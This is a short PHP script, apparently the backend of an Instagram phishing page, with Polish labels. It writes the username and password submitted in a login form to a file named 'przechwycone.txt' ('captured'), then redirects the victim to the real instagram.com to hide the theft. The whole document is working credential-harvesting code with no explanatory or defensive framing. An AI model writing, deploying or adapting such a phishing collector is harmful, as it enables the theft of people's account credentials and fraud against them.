<?php

file_put_contents("przechwycone.txt", "Instagram Login: " . $_POST['username'] . " Hasło: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>